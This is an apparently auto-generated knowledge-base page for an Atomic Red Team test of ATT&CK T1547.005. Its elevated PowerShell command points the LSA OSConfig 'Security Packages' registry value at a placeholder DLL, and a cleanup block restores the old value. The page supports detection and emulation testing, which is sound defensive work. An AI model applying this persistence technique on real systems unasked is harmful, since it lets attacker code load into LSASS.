---
atomic_guid: "de3f8e74-3351-4fdb-a442-265dbf231738"
title: "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig Security Support Provider configuration in registry"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.005"
attack_technique_name: "Boot or Logon Autostart Execution: Security Support Provider"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.005/T1547.005.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "de3f8e74-3351-4fdb-a442-265dbf231738"
  - "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig Security Support Provider configuration in registry"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry

Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.

## Metadata

- Atomic GUID: de3f8e74-3351-4fdb-a442-265dbf231738
- Technique: T1547.005: Boot or Logon Autostart Execution: Security Support Provider
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1547.005/T1547.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.005]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' -Value "$oldvalue";
$newvalue = "AtomicTest.dll";
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
```

### Cleanup

```powershell
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value "$oldvalue";
Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old';
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.005/T1547.005.yaml)
